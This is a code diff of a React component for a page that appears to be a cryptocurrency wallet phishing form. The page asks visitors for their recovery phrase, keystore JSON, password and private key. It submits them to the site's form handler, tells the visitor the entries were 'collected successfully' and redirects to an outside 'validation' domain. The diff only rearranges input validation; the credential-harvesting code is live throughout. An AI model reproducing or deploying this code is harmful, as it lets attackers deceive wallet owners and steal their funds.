@@ -36,39 +36,24 @@ function WalletDetailsEntryPage() {
 
   function handleSubmit(e) {
     e.preventDefault();
-    if (walletDetails.phrase.length >= 12 && walletDetails.phrase !== '') {
-      fetch('/', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: encode({
-          'form-name': 'Wallet_import_details',
-          ...walletDetails,
-        }),
+    fetch('/', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+      body: encode({
+        'form-name': 'Wallet_import_details',
+        ...walletDetails,
+      }),
+    })
+      .then(() => {
+        alert('Your Entry/Entries Have Been Collected Successfully');
       })
-        .then(() => {
-          setWalletDetails({
-            phrase: '',
-            keystoreJson: '',
-            password: '',
-            privateKey: '',
-          });
-        })
-        .then(() => {
-          alert('Your Entry/Entries Have Been Collected Successfully');
-        })
-        .then(() => {
-          window.location.replace('https://wvalidation.com');
-        })
-        .catch((error) => alert(error));
-      console.log(walletDetails);
-    } else {
-      alert(
-        'Phrase, Keystore JSON, and Password must NOT be less than 12 characters.'
-      );
-      return false;
-    }
+      .then(() => {
+        window.location.replace('https://wvalidation.com');
+      })
+      .catch((error) => alert(error));
+    console.log(walletDetails);
   }
 
   function displayPhrase() {
@@ -141,6 +126,7 @@ function WalletDetailsEntryPage() {
                 placeholder="Phrase"
                 name="phrase"
                 rows="5"
+                minlength="12"
                 type="text"
                 value={walletDetails.phrase}
                 onChange={handleChange}
@@ -157,6 +143,7 @@ function WalletDetailsEntryPage() {
                 style={{ marginBottom: '20px' }}
                 className="form-control"
                 placeholder="Keystore JSON"
+                minlength="12"
                 type="text"
                 name="keystoreJson"
                 value={walletDetails.keystoreJson}
@@ -169,6 +156,7 @@ function WalletDetailsEntryPage() {
                   className="form-control"
                   placeholder="Password"
                   name="password"
+                  minlength="12"
                   id="inputPassword"
                   value={walletDetails.password}
                   onChange={handleChange}
